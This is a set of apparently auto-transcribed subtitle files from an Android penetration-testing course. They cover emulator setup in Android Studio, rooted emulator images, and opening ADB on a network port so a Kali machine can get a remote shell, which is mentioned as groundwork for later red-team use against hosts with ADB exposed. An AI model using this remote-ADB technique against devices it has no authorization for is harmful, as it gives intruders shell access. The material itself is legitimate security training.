00:05:23.620 --> 00:05:26.540
use throughout this course to interact with our

111
00:05:26.540 --> 00:05:27.440
Android emulators.

112
00:05:32.340 --> 00:05:34.240
Okay, you can see here that my Kask

113
00:05:34.240 --> 00:05:37.140
Android Platform Tools is already installed, but for

114
00:05:37.140 --> 00:05:40.960
you it should just ask you and show

115
00:05:40.960 --> 00:05:42.980
you downloading all the tools, and to confirm

116
00:05:42.980 --> 00:05:44.480
that this worked we can just do the

117
00:05:44.480 --> 00:05:47.060
command ADB here, and if you have the

118
00:05:47.060 --> 00:05:49.340
command ADB working properly and you got the

119
00:05:49.340 --> 00:05:51.400
manual up, then you should be good to

120
00:05:51.400 --> 00:05:53.520
go with all the platform tools as well.

121
00:05:53.880 --> 00:05:56.380
Again, ADB and those platform tools are going

122
00:05:56.380 --> 00:05:58.300
to allow us to interact with our Android

123
00:05:58.300 --> 00:06:01.000
emulator, which you'll see throughout the rest of

124
00:06:01.000 --> 00:06:02.100
this Android class.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.720 --> 00:00:02.960
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, now that we have Android Studio fully

2
00:00:02.960 --> 00:00:05.420
installed, let's go through some useful features and

3
00:00:05.420 --> 00:00:07.680
also set up our very first emulators.

4
00:00:08.560 --> 00:00:10.420
So what I like to do with Android

5
00:00:10.420 --> 00:00:13.580
Studio is go to this view part of

6
00:00:13.580 --> 00:00:14.620
the toolbar up here.

7
00:00:15.100 --> 00:00:16.740
I go to tool windows, and there's a

8
00:00:16.740 --> 00:00:19.880
few useful tools for Android pen testing in

9
00:00:19.880 --> 00:00:20.100
here.

10
00:00:20.680 --> 00:00:22.320
One thing is going to be the device

11
00:00:22.320 --> 00:00:23.220
file explorer.

12
00:00:23.720 --> 00:00:26.020
So when we actually have an emulator running

13
00:00:26.020 --> 00:00:28.500
on our machine here, we're going to be

14
00:00:28.500 --> 00:00:30.840
able to go through the entire file system

15
00:00:30.840 --> 00:00:32.360
of the device, and this is going to

16
00:00:32.360 --> 00:00:35.040
be helpful for us because when we're looking

17
00:00:35.040 --> 00:00:36.640
through the file system, we can go out

18
00:00:36.640 --> 00:00:39.240
there and look for certain data, like maybe

19
00:00:39.240 --> 00:00:41.720
XML files that are stored on the device,

20
00:00:41.940 --> 00:00:44.480
or look for places where the application might

21
00:00:44.480 --> 00:00:46.460
be storing some sensitive information.

22
00:00:47.380 --> 00:00:48.760
If I also go to the view and

23
00:00:48.760 --> 00:00:51.460
tool windows again, you can also click terminal,

24
00:00:51.660 --> 00:00:53.540
which I already have open here in the

25
00:00:53.540 --> 00:00:55.840
bottom corner, but from here you can run

26
00:00:55.840 --> 00:00:58.800
any normal terminal commands such as adb shell

27
00:00:58.800 --> 00:01:01.580
here, or I can even do normal Windows

28
00:01:01.580 --> 00:01:01.920
commands.

29
00:01:02.020 --> 00:01:03.420
You can see that I have a terminal

30
00:01:03.420 --> 00:01:06.040
right into my Windows machine here, and so

31
00:01:06.040 --> 00:01:08.380
you'll often see me throughout this course interact

32
00:01:08.380 --> 00:01:10.860
with the Android device through this terminal just

33
00:01:10.860 --> 00:01:14.000
because it's all nice and consolidated within Android

34
00:01:14.000 --> 00:01:14.860
Studio here.

35
00:01:15.340 --> 00:01:17.520
So I'll run commands like adb shell to

36
00:01:17.520 --> 00:01:19.600
get access to the Android phone, so I

37
00:01:19.600 --> 00:01:21.420
have everything consolidated right here.

38
00:01:22.380 --> 00:01:24.640
Also, on the bottom of the terminal is

39
00:01:24.640 --> 00:01:27.620
the logcat, and the logcat is very useful

40
00:01:27.620 --> 00:01:29.740
because we can use this when our application

41
00:01:29.740 --> 00:01:33.020
is running to see if any sensitive data

42
00:01:33.020 --> 00:01:35.380
might be stored in the log files.

43
00:01:35.560 --> 00:01:37.400
Again, you can also get there from view

44
00:01:37.400 --> 00:01:40.060
and tool windows and go down to the

45
00:01:40.060 --> 00:01:41.160
logcat as well.

46
00:01:41.740 --> 00:01:43.400
I definitely recommend you take a look at

47
00:01:43.400 --> 00:01:45.840
the different types of tools that are here

48
00:01:45.840 --> 00:01:48.780
in Android Studio, but these three are the

49
00:01:48.780 --> 00:01:50.720
most common ones that I'll use for pen

50
00:01:50.720 --> 00:01:52.860
testing, so we have the device file explorer,

51
00:01:53.540 --> 00:01:55.380
logcat, and also the terminal.

52
00:01:56.240 --> 00:01:58.440
Now when we want to start our Android

53
00:01:58.440 --> 00:02:01.000
emulators, it's very easy with Android Studio.

54
00:02:01.440 --> 00:02:04.020
We're going to click the AVD manager here,

55
00:02:04.120 --> 00:02:05.980
which looks like a little phone with a

56
00:02:05.980 --> 00:02:07.960
little Android guy right next to it.

57
00:02:08.720 --> 00:02:10.900
I'm going to click create virtual device now,

58
00:02:11.620 --> 00:02:14.240
and here you'll see the multitude of options

59
00:02:14.240 --> 00:02:16.340
that we have when we're using Android Studio.

60
00:02:16.340 --> 00:02:19.420
Remember that Android Studio is more of a

61
00:02:19.420 --> 00:02:22.520
developer focused tool, and so this gives us

62
00:02:22.520 --> 00:02:25.660
the opportunity to have multiple different screen sizes

63
00:02:25.660 --> 00:02:29.420
and experiment with how our application might look

64
00:02:29.420 --> 00:02:30.920
on different Android devices.

65
00:02:31.320 --> 00:02:33.340
You can see we have different categories such

66
00:02:33.340 --> 00:02:37.300
as Android TV, wear operating system, tablets, and

67
00:02:37.300 --> 00:02:40.140
even an automotive screen size here.

68
00:02:40.520 --> 00:02:42.820
So this is very useful for developers so

69
00:02:42.820 --> 00:02:44.640
that they're able to see how their application

70
00:02:44.640 --> 00:02:46.580
looks when we have it installed on different

71
00:02:46.580 --> 00:02:47.540
types of devices.

72
00:02:48.560 --> 00:02:51.200
For our uses in Android pen testing, I

73
00:02:51.200 --> 00:02:54.000
personally mostly focus on just the phone here.

74
00:02:54.500 --> 00:02:56.700
Obviously if you have some kind of application

75
00:02:56.700 --> 00:02:58.120
that you want to test, you can try

76
00:02:58.120 --> 00:03:00.680
it on things like the tablet or automotive

77
00:03:00.680 --> 00:03:01.360
as well.

78
00:03:02.760 --> 00:03:04.900
And what I usually go for is something

79
00:03:04.900 --> 00:03:08.500
like this Nexus 5 device, because this will

80
00:03:08.500 --> 00:03:11.380
have the ability to instal different Android versions.

81
00:03:11.380 --> 00:03:13.960
And you see here this column that says

82
00:03:13.960 --> 00:03:14.620
the Play Store.

83
00:03:15.240 --> 00:03:18.020
So any of these emulators here with the

84
00:03:18.020 --> 00:03:20.460
Play Store icon are actually able to pull

85
00:03:20.460 --> 00:03:23.620
applications directly off of the Android Play Store,

86
00:03:23.940 --> 00:03:26.160
and then you'll be able to analyse them

87
00:03:26.160 --> 00:03:28.940
locally once you've installed them on your emulator.

88
00:03:29.680 --> 00:03:31.000
And what I usually do, I'm going to

89
00:03:31.000 --> 00:03:33.380
click next here, you can see now that

90
00:03:33.380 --> 00:03:35.540
I have a bunch of different system images

91
00:03:35.540 --> 00:03:36.500
to choose from.

92
00:03:36.500 --> 00:03:40.400
This first column, the recommended column, every single

93
00:03:40.400 --> 00:03:43.420
one of these emulators, this version of the

94
00:03:43.420 --> 00:03:46.200
Android operating system has the Google Play Store

95
00:03:46.200 --> 00:03:46.740
installed.

96
00:03:47.320 --> 00:03:49.040
And how this can be useful for us

97
00:03:49.040 --> 00:03:51.640
as a penetration tester is that we'll be

98
00:03:51.640 --> 00:03:54.960
able to pull that Android APK directly off

99
00:03:54.960 --> 00:03:57.020
of the Play Store and directly off of

100
00:03:57.020 --> 00:03:57.520
our phone.

101
00:03:58.080 --> 00:04:00.740
So what I usually recommend is that a

102
00:04:00.740 --> 00:04:02.860
pen tester has at least two to three

103
00:04:02.860 --> 00:04:05.500
emulators at all times that you'll be using.

104
00:04:06.000 --> 00:04:08.960
So I definitely recommend using something like an

105
00:04:08.960 --> 00:04:11.960
API level 29, or even the 30 here

106
00:04:11.960 --> 00:04:13.600
with the Google Play Store installed.

107
00:04:13.920 --> 00:04:16.459
We're going to consider this emulator as kind

108
00:04:16.459 --> 00:04:19.540
of our Play Store puller machine, right?

109
00:04:19.760 --> 00:04:22.100
This is going to be our Android phone

110
00:04:22.100 --> 00:04:24.620
that we log into, we pull applications off

111
00:04:24.620 --> 00:04:26.660
the Play Store, and then we pull them

112
00:04:26.660 --> 00:04:29.100
back down to do that analysis locally.

113
00:04:29.580 --> 00:04:31.280
In the next video I'll show you how

114
00:04:31.280 --> 00:04:34.360
to exactly pull these APKs off the Play

115
00:04:34.360 --> 00:04:36.200
Store, but for now I just want to

116
00:04:36.200 --> 00:04:37.880
take a moment and show you how to

117
00:04:37.880 --> 00:04:39.740
set up the two different emulators that I

118
00:04:39.740 --> 00:04:40.140
recommend.

119
00:04:40.840 --> 00:04:42.620
So again, I'm going to set up this

120
00:04:42.620 --> 00:04:44.340
one with the Google Play Store, so I'll

121
00:04:44.340 --> 00:04:47.900
click Android release name queue, and Android version

122
00:04:47.900 --> 00:04:50.220
10, Google Play already installed.

123
00:04:51.040 --> 00:04:52.480
And I'm going to just call this my

124
00:04:52.480 --> 00:04:53.400
Play Store puller.

125
00:04:53.760 --> 00:04:55.660
You can obviously call this anything that you

126
00:04:55.660 --> 00:04:57.540
want, however you want to name your emulator.

127
00:04:58.120 --> 00:04:59.980
I'm going to click finish here, and to

128
00:04:59.980 --> 00:05:02.140
make sure everything's working properly I'm going to

129
00:05:02.140 --> 00:05:04.400
click the start button here, and make sure

130
00:05:04.400 --> 00:05:06.680
that the Android device is actually able to

131
00:05:06.680 --> 00:05:06.880
boot.

132
00:05:08.640 --> 00:05:10.620
So here is my emulator, and you can

133
00:05:10.620 --> 00:05:13.480
see that it's literally exactly like an Android

134
00:05:13.480 --> 00:05:15.180
phone just running on your computer.

135
00:05:16.040 --> 00:05:18.060
Now a little cool thing about the emulator

136
00:05:18.060 --> 00:05:20.240
is it has some convenient settings we'll be

137
00:05:20.240 --> 00:05:21.980
using in a little while when we get

138
00:05:21.980 --> 00:05:23.820
to the dynamic analysis section.

139
00:05:24.380 --> 00:05:26.500
So for example, if you click more here,

140
00:05:27.080 --> 00:05:28.560
you'll be able to see a bunch of

141
00:05:28.560 --> 00:05:30.740
the different settings that apply to this emulator.

142
00:05:31.220 --> 00:05:32.880
So you're able to set up things like

143
00:05:32.880 --> 00:05:34.840
a special location if you want to have

144
00:05:34.840 --> 00:05:36.800
testing from a certain location.

145
00:05:37.360 --> 00:05:40.460
Maybe you're trying to test something like geofencing

146
00:05:40.460 --> 00:05:41.500
for an application.

147
00:05:42.340 --> 00:05:43.480
This can be something useful.

148
00:05:44.060 --> 00:05:46.240
There's obviously all kinds of different settings here

149
00:05:46.240 --> 00:05:48.340
as well as cellular network settings.

150
00:05:48.820 --> 00:05:51.280
Battery settings to test how your application runs

151
00:05:51.280 --> 00:05:52.640
on different battery levels.

152
00:05:53.160 --> 00:05:55.300
Things with the camera, you can also inject

153
00:05:55.300 --> 00:05:57.580
images in there if you want to have

154
00:05:57.580 --> 00:06:00.180
a sample image for an application that's running

155
00:06:00.180 --> 00:06:01.640
on your Android phone.

156
00:06:01.920 --> 00:06:03.720
There's a bunch of different settings in here

157
00:06:03.720 --> 00:06:05.280
that you can feel free to look through

158
00:06:05.280 --> 00:06:07.120
whenever you're using this.

159
00:06:07.760 --> 00:06:09.640
One that's going to be important is under

160
00:06:09.640 --> 00:06:12.880
the settings here, and we'll be fixing these

161
00:06:12.880 --> 00:06:14.700
proxy settings a little bit later.

162
00:06:15.120 --> 00:06:16.240
You'll notice that it's just going to be

163
00:06:16.240 --> 00:06:18.440
the default here like this when you first

164
00:06:18.440 --> 00:06:21.080
start up an emulator, but these proxy settings

165
00:06:21.080 --> 00:06:22.560
are going to be important when we go

166
00:06:22.560 --> 00:06:24.100
ahead and we're going to be trying to

167
00:06:24.100 --> 00:06:25.940
intercept this traffic with Burp Suite.

168
00:06:25.940 --> 00:06:29.540
For now, just as an overview, let's go

169
00:06:29.540 --> 00:06:30.420
back to our phone.

170
00:06:30.960 --> 00:06:32.720
You can see here that we have our

171
00:06:32.720 --> 00:06:33.720
phone up and running.

172
00:06:34.340 --> 00:06:37.700
We can grab this area like we're sliding

173
00:06:37.700 --> 00:06:39.380
it with our finger to see all the

174
00:06:39.380 --> 00:06:40.800
applications installed.

175
00:06:41.240 --> 00:06:42.920
I'm going to click the Play Store here

176
00:06:42.920 --> 00:06:45.040
just as an example, and you can see

177
00:06:45.040 --> 00:06:47.100
that the Google Play Store is installed.

178
00:06:48.280 --> 00:06:49.780
This is going to be important because we're

179
00:06:49.780 --> 00:06:51.480
going to pull our apps off the Play

180
00:06:51.480 --> 00:06:53.700
Store, so it's coming from a trusted source.

181
00:06:54.260 --> 00:06:56.100
Now that we know that this emulator is

182
00:06:56.100 --> 00:06:58.400
running, let's actually close this and get the

183
00:06:58.400 --> 00:07:00.000
other emulator up and running.

184
00:07:01.560 --> 00:07:04.300
To make another virtual device, which I recommend

185
00:07:04.300 --> 00:07:06.980
at least having two emulators at all times,

186
00:07:07.340 --> 00:07:09.040
you're going to click this Create Virtual Device

187
00:07:09.040 --> 00:07:09.920
just like before.

188
00:07:10.460 --> 00:07:12.360
Personally, I'm going to use the Nexus 5

189
00:07:12.360 --> 00:07:13.920
just because I like that device.

190
00:07:14.800 --> 00:07:16.520
I'm going to click Next, and now we're

191
00:07:16.520 --> 00:07:18.100
going to go into some of the other

192
00:07:18.100 --> 00:07:20.660
images that are available here on Android Studio.

193
00:07:20.660 --> 00:07:23.380
I'm going to click the x86 images column,

194
00:07:23.860 --> 00:07:25.260
and you can see that we have tonnes

195
00:07:25.260 --> 00:07:27.900
of different types of the Android operating system

196
00:07:27.900 --> 00:07:29.820
here going all the way back to API

197
00:07:29.820 --> 00:07:30.700
level 16.

198
00:07:31.440 --> 00:07:34.320
Also, under the other images, this stuff goes

199
00:07:34.320 --> 00:07:38.840
all the way back to the original Android

200
00:07:38.840 --> 00:07:39.680
operating system.

201
00:07:39.760 --> 00:07:41.900
The lowest here is this jelly bean on

202
00:07:41.900 --> 00:07:43.220
API level 16.

203
00:07:46.750 --> 00:07:48.710
What's nice about these is that you're going

204
00:07:48.710 --> 00:07:50.510
to be able to have different emulators on

205
00:07:50.510 --> 00:07:53.250
different versions of the Android operating system.

206
00:07:53.890 --> 00:07:56.870
I recommend having something in the 22 to

207
00:07:56.870 --> 00:07:59.090
24 range, and I want you to pick

208
00:07:59.090 --> 00:08:00.810
one of the ones with Google API.

209
00:08:01.130 --> 00:08:03.450
If you don't have, say for example, this

210
00:08:03.450 --> 00:08:06.130
marshmallow one downloaded, all you need to do

211
00:08:06.130 --> 00:08:08.250
is click this Download button, and it will

212
00:08:08.250 --> 00:08:10.870
automatically start downloading that system image.

213
00:08:11.510 --> 00:08:14.030
I'm going to click the Google API one

214
00:08:14.030 --> 00:08:14.970
again, this marshmallow.

215
00:08:15.730 --> 00:08:17.410
What's going to be cool about this one

216
00:08:17.410 --> 00:08:19.470
is we'll be able to actually root this

217
00:08:19.470 --> 00:08:19.870
device.

218
00:08:19.870 --> 00:08:22.490
If I click Next, I'll just leave this

219
00:08:22.490 --> 00:08:24.170
named as is, click Finish.

220
00:08:27.600 --> 00:08:29.460
It'll take just a second to start the

221
00:08:29.460 --> 00:08:30.780
Android device here.

222
00:08:31.400 --> 00:08:33.299
I'm going to click Play on our API

223
00:08:33.299 --> 00:08:39.570
level 23, and we'll see some differences in

224
00:08:39.570 --> 00:08:41.470
terms of the permissions that we have to

225
00:08:41.470 --> 00:08:43.030
this Android phone.

226
00:08:43.610 --> 00:08:45.750
You can see now that the emulator is

227
00:08:45.750 --> 00:08:46.070
starting.

228
00:08:46.810 --> 00:08:48.370
I'm going to go to my terminal here

229
00:08:48.370 --> 00:08:49.450
in Android Studio.

230
00:08:50.170 --> 00:08:51.790
Also, something to note, you can see that

231
00:08:51.790 --> 00:08:55.070
the operating system, the file system has populated

232
00:08:55.070 --> 00:08:57.130
here on our device file explorer.

233
00:08:57.670 --> 00:08:59.290
This is something we would be looking through

234
00:08:59.290 --> 00:09:01.230
just like a normal file system when we're

235
00:09:01.230 --> 00:09:02.470
doing our pen testing.

236
00:09:03.310 --> 00:09:05.410
Here I'm going to do ADB root.

237
00:09:06.330 --> 00:09:08.950
You can see that ADB is already running

238
00:09:08.950 --> 00:09:13.390
as root, and that's because these images that

239
00:09:13.390 --> 00:09:17.730
we get from the Android Studio emulator, the

240
00:09:17.730 --> 00:09:20.010
SDK manager there, when we go to the

241
00:09:20.010 --> 00:09:23.470
x86 images, all these devices are actually already

242
00:09:23.470 --> 00:09:23.810
rooted.

243
00:09:23.810 --> 00:09:26.910
If I do an ADB shell, you can

244
00:09:26.910 --> 00:09:29.310
see that I am actually root on this

245
00:09:29.310 --> 00:09:31.350
device, which means that I'll be able to

246
00:09:31.350 --> 00:09:33.650
go through the entire file system and see

247
00:09:33.650 --> 00:09:35.750
all the different applications that we talked about

248
00:09:35.750 --> 00:09:38.750
with the application security section of this course.

249
00:09:39.330 --> 00:09:40.970
The nice thing is that this is now

250
00:09:40.970 --> 00:09:42.030
like a rooted device.

251
00:09:42.630 --> 00:09:45.250
Once I pull the APK off of my

252
00:09:45.250 --> 00:09:48.290
Google Play Store emulator, then I could actually

253
00:09:48.290 --> 00:09:50.330
put it on here and investigate some of

254
00:09:50.330 --> 00:09:52.130
the files and everything that are stored on

255
00:09:52.130 --> 00:09:52.290
it.

256
00:09:52.290 --> 00:09:56.350
If I go back to my previous emulator,

257
00:09:59.080 --> 00:10:01.520
get the SDK manager up again, if I

258
00:10:01.520 --> 00:10:04.100
pull up this one that's on the Google

259
00:10:04.100 --> 00:10:07.140
Play API and it's running Android version 10,

260
00:10:07.480 --> 00:10:09.220
and now I try to do an ADB

261
00:10:09.220 --> 00:10:11.300
root, it's not going to let me because

262
00:10:11.300 --> 00:10:14.620
these emulators that have the Google Play Store

263
00:10:14.620 --> 00:10:17.180
on them are not able to be emulated.

264
00:10:17.660 --> 00:10:19.720
You can see the difference there in terms

265
00:10:19.720 --> 00:10:21.300
of the amount of permissions we're going to

266
00:10:21.300 --> 00:10:23.880
have when we're interacting with our different emulators,

267
00:10:24.080 --> 00:10:25.880
which is why I recommend having at least

268
00:10:25.880 --> 00:10:28.060
two or three emulators that you're going to

269
00:10:28.060 --> 00:10:30.060
be using throughout this course.

270
00:10:30.600 --> 00:10:34.900
Let's move now into actually pulling an application

271
00:10:34.900 --> 00:10:36.860
off the Google Play Store in our next

272
00:10:36.860 --> 00:10:37.200
video.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.460 --> 00:00:01.420
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Hey everyone, I just want to make a

2
00:00:01.420 --> 00:00:04.720
quick course update here, and this is to

3
00:00:04.720 --> 00:00:06.840
show you how you can actually access an

4
00:00:06.840 --> 00:00:10.480
emulator from one host machine to another machine

5
00:00:10.480 --> 00:00:12.560
on your network, or also if you're using

6
00:00:12.560 --> 00:00:13.900
a virtual machine, right?

7
00:00:14.060 --> 00:00:16.500
So if you're hosting a virtual machine on

8
00:00:16.500 --> 00:00:19.060
say your Windows host or Mac host or

9
00:00:19.060 --> 00:00:20.560
something like that, and you want to reach

10
00:00:20.560 --> 00:00:23.780
out to the emulator that is on that

11
00:00:23.780 --> 00:00:25.900
host machine and hit it with ADB, I

12
00:00:25.900 --> 00:00:27.300
want to show you options for that.

13
00:00:27.660 --> 00:00:29.760
And also if you were on another networked

14
00:00:29.760 --> 00:00:31.980
device, how would you open a port on

15
00:00:31.980 --> 00:00:34.860
your host machine so that another networked device

16
00:00:34.860 --> 00:00:36.920
can actually hit the emulator, right?

17
00:00:37.180 --> 00:00:39.200
So you can see here on my Windows

18
00:00:39.200 --> 00:00:41.580
machine, I have an emulator pulled up here,

19
00:00:42.020 --> 00:00:42.300
okay?

20
00:00:43.020 --> 00:00:46.040
And so my host machine here, if we

21
00:00:46.040 --> 00:00:49.880
look at ipconfig, is at 192.168.127

22
00:00:49.880 --> 00:00:51.820
.182, right?

23
00:00:51.980 --> 00:00:54.220
Again, keep this IP address in mind, we're

24
00:00:54.220 --> 00:00:55.660
going to need it in just a minute.

25
00:00:55.660 --> 00:00:57.900
So if we want to actually start an

26
00:00:57.900 --> 00:01:01.860
emulator with a port open on our host

27
00:01:01.860 --> 00:01:03.500
machine so we can hit it from anywhere,

28
00:01:03.720 --> 00:01:07.520
we're going to use the command adb-a,

29
00:01:07.700 --> 00:01:11.120
and then no daemon server is the name

30
00:01:11.120 --> 00:01:11.620
of this command.

31
00:01:11.900 --> 00:01:14.580
Just look in the notes below for all

32
00:01:14.580 --> 00:01:15.760
the commands that are going to be listed

33
00:01:15.760 --> 00:01:16.460
in this video.

34
00:01:17.180 --> 00:01:19.240
Okay, so here we see an error, it

35
00:01:19.240 --> 00:01:22.560
says smart socket listener cannot bind to this

36
00:01:22.560 --> 00:01:25.120
port, so this means that adb is already

37
00:01:25.120 --> 00:01:28.160
running on port 5037, so we actually have

38
00:01:28.160 --> 00:01:30.580
to go in and kill all instances of

39
00:01:30.580 --> 00:01:31.080
adb.

40
00:01:31.240 --> 00:01:32.180
So we're just going to do a quick

41
00:01:32.180 --> 00:01:35.440
task kill slash f slash t slash im

42
00:01:35.440 --> 00:01:38.100
adb.exe, okay?

43
00:01:38.220 --> 00:01:43.490
And this will kill our adb task, okay?

44
00:01:43.490 --> 00:01:44.930
So you can see the process was now

45
00:01:44.930 --> 00:01:45.430
terminated.

46
00:01:45.490 --> 00:01:47.290
Now we can just go right back and

47
00:01:47.290 --> 00:01:49.870
do an adb-a no daemon server again,

48
00:01:50.030 --> 00:01:52.590
and now we can see we have this

49
00:01:52.590 --> 00:01:54.170
calling send auth response.

50
00:01:54.250 --> 00:01:55.690
Now the first time you do this on

51
00:01:55.690 --> 00:01:58.750
Windows machine, you're going to get a UAC

52
00:01:58.750 --> 00:01:59.350
error.

53
00:01:59.530 --> 00:02:01.150
You're just going to have to accept the

54
00:02:01.150 --> 00:02:03.730
UAC prompt because you're basically opening a port

55
00:02:03.730 --> 00:02:05.130
on your Windows machine, right?

56
00:02:05.470 --> 00:02:07.350
Not sure if on Mac it'll ask for

57
00:02:07.350 --> 00:02:09.690
administrative password for this or not, but just

58
00:02:09.690 --> 00:02:10.370
keep that in mind.

59
00:02:10.690 --> 00:02:12.830
You're basically opening a port on your host

60
00:02:12.830 --> 00:02:16.570
machine, and that would be 192.168.127

61
00:02:16.570 --> 00:02:19.450
.182 port 5037.

62
00:02:19.970 --> 00:02:21.950
So now if I hop over to a

63
00:02:21.950 --> 00:02:24.270
Kali box, in my case I actually have

64
00:02:24.270 --> 00:02:27.370
this running on a totally separate IP address.

65
00:02:27.670 --> 00:02:31.270
We do an ipconfig here, you can see

66
00:02:31.270 --> 00:02:33.490
that my IP address of this Kali Linux

67
00:02:33.490 --> 00:02:37.810
box is 192.168.127.241. This is

68
00:02:37.810 --> 00:02:40.150
running on a Proxmox server that I'm hosting

69
00:02:40.150 --> 00:02:41.990
in my home network, right?

70
00:02:42.230 --> 00:02:45.230
So this is a totally separate IP address,

71
00:02:45.410 --> 00:02:47.250
and we're going to reach from this Kali

72
00:02:47.250 --> 00:02:49.390
Linux box to the emulator now.

73
00:02:50.070 --> 00:02:52.290
So all we need to do is do

74
00:02:52.290 --> 00:02:54.650
just adb like we normally would, then we're

75
00:02:54.650 --> 00:02:56.710
going to do a "-H", and this is

76
00:02:56.710 --> 00:02:59.890
asking you what the IP address of the

77
00:02:59.890 --> 00:03:00.670
target is.

78
00:03:00.790 --> 00:03:02.770
Now in this case it's going to be

79
00:03:02.770 --> 00:03:05.750
that IP address of my Windows machine and

80
00:03:05.750 --> 00:03:09.390
not the IP address of the emulator itself,

81
00:03:09.510 --> 00:03:12.270
because remember the port is actually open on

82
00:03:12.270 --> 00:03:13.090
the Windows machine.

83
00:03:13.350 --> 00:03:15.970
So it's going to be 192.168.127

84
00:03:15.970 --> 00:03:17.750
.182, right?

85
00:03:18.130 --> 00:03:23.190
So 192.168.127.182, right?

86
00:03:23.310 --> 00:03:24.850
Let's double check that, okay?

87
00:03:25.290 --> 00:03:27.310
And then the port is going to be

88
00:03:27.310 --> 00:03:29.390
"-P", and 5037.

89
00:03:29.930 --> 00:03:34.270
Then we're just like any other adb command.

90
00:03:34.430 --> 00:03:35.730
Just like later in the course when we're

91
00:03:35.730 --> 00:03:38.890
doing adb shell, going in, getting information, we're

92
00:03:38.890 --> 00:03:40.650
doing adb pull and push.

93
00:03:40.730 --> 00:03:42.730
You can do the exact same things, but

94
00:03:42.730 --> 00:03:44.490
you just need to provide these two extra

95
00:03:44.490 --> 00:03:46.870
parameters of the host and the port.

96
00:03:46.970 --> 00:03:48.770
So now I can just go and say

97
00:03:48.770 --> 00:03:50.110
shell, and boom!

98
00:03:50.230 --> 00:03:53.350
We instantly drop into our adb shell.

99
00:03:53.590 --> 00:03:55.430
So now I'm actually on the emulator, I

100
00:03:55.430 --> 00:03:57.610
can do ls, I can interact with this

101
00:03:57.610 --> 00:03:59.870
exactly like I'd be able to if I

102
00:03:59.870 --> 00:04:01.610
was doing this from the host machine, right?

103
00:04:02.210 --> 00:04:04.950
And just doing like, you know, if I

104
00:04:04.950 --> 00:04:09.250
cleared this out and said adb shell, exactly

105
00:04:09.250 --> 00:04:11.970
the same thing between the host machine's command

106
00:04:11.970 --> 00:04:14.950
prompt here and my Kali Linux command prompt.

107
00:04:15.110 --> 00:04:16.970
So if that's something you're interested in, having

108
00:04:16.970 --> 00:04:19.649
a separately networked device to gain access to

109
00:04:19.649 --> 00:04:21.970
your emulator, we're also going to use this

110
00:04:21.970 --> 00:04:23.950
in some red teaming videos that can be

111
00:04:23.950 --> 00:04:26.630
a bonus section later in the course to

112
00:04:26.630 --> 00:04:28.670
show how you can use this if you're

113
00:04:28.670 --> 00:04:30.230
within a network and you want to reach

114
00:04:30.230 --> 00:04:33.130
out to a host that has adb active

115
00:04:33.130 --> 00:04:34.930
on it or developer tools, right?

116
00:04:35.210 --> 00:04:36.670
So I hope you found this useful.

117
00:04:37.130 --> 00:04:38.670
I'll see you in the next videos.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.070 --> 00:00:02.530
(Transcribed by TurboScribe. Go Unlimited to remove this message.) For this course, we'll be using Android Studio

2
00:00:02.530 --> 00:00:04.230
as our primary emulator.

3
00:00:04.570 --> 00:00:06.490
But before we move on, I wanted to

4
00:00:06.490 --> 00:00:09.010
show you at least two other emulating tools

5
00:00:09.010 --> 00:00:11.270
that you can use to have an Android

6
00:00:11.270 --> 00:00:12.750
phone on your computer.

7
00:00:13.110 --> 00:00:15.350
One of these that is very popular with

8
00:00:15.350 --> 00:00:17.470
penetration testers is Genymotion.

9
00:00:18.150 --> 00:00:20.390
And they have a desktop version of this

10
00:00:20.390 --> 00:00:22.970
tool as well as now some cloud versions

11
00:00:22.970 --> 00:00:23.610
of this tool.

12
00:00:24.130 --> 00:00:25.930
I have personally not used this tool, but

13
00:00:25.930 --> 00:00:27.970
I do know plenty of people do use

14
00:00:27.970 --> 00:00:29.910
this tool for their security testing.

15
00:00:30.470 --> 00:00:32.910
And it can help to have a variety

16
00:00:32.910 --> 00:00:35.310
of emulators as well without having to go

17
00:00:35.310 --> 00:00:37.170
through the setup of Android Studio.

18
00:00:37.790 --> 00:00:40.110
So you can find all the pricing information

19
00:00:40.110 --> 00:00:41.050
on their website.

20
00:00:41.270 --> 00:00:43.470
It's charged by the hour, around 50 cents

21
00:00:43.470 --> 00:00:44.790
per hour for the device.

22
00:00:45.150 --> 00:00:47.590
They also have these devices available on different

23
00:00:47.590 --> 00:00:48.570
types of the cloud.

24
00:00:48.690 --> 00:00:50.690
So you have the Alibaba cloud, the Azure

25
00:00:50.690 --> 00:00:52.670
cloud, the GCP and AWS.

26
00:00:53.090 --> 00:00:55.750
So tons of different cloud providers integrate well

27
00:00:55.750 --> 00:00:56.490
with this tool.

28
00:00:56.830 --> 00:01:00.170
They also have a completely SaaS version of

29
00:01:00.170 --> 00:01:01.270
the Android device.

30
00:01:01.410 --> 00:01:02.570
So you don't need to set up anything

31
00:01:02.570 --> 00:01:03.569
in any of the clouds.

32
00:01:04.150 --> 00:01:06.170
And also they have a desktop version.

33
00:01:06.370 --> 00:01:08.270
So there's a few more choices there for

34
00:01:08.270 --> 00:01:09.790
you in terms of emulation.

35
00:01:10.270 --> 00:01:12.610
It's something that you're curious about if you're

36
00:01:12.610 --> 00:01:15.090
looking for any alternatives to Android Studio.

37
00:01:15.830 --> 00:01:19.270
Also something else worthy of noting is with

38
00:01:19.270 --> 00:01:22.750
Visual Studio, there is also an emulator for

39
00:01:22.750 --> 00:01:23.370
Android.

40
00:01:23.530 --> 00:01:25.730
And this is actually used if you're ever

41
00:01:25.730 --> 00:01:28.850
interested in developing an Android or iOS app

42
00:01:28.850 --> 00:01:32.990
using a tool called Xamarin, this allows you

43
00:01:32.990 --> 00:01:37.330
to create an Android and iOS app using

44
00:01:37.330 --> 00:01:40.010
the same code from a source, right?

45
00:01:40.330 --> 00:01:42.450
And that tool actually comes with an Android

46
00:01:42.450 --> 00:01:43.610
emulator as well.

47
00:01:43.790 --> 00:01:45.850
So if you're interested in developing for both

48
00:01:45.850 --> 00:01:48.850
Android and iOS, maybe for a side project

49
00:01:48.850 --> 00:01:51.490
in terms of mobile apps, Xamarin might be

50
00:01:51.490 --> 00:01:52.750
something that you wanna look into.

51
00:01:52.750 --> 00:01:56.370
And also this Visual Studio emulator for Android.

52
00:01:56.630 --> 00:01:58.510
Now, keep in mind, if you're running this

53
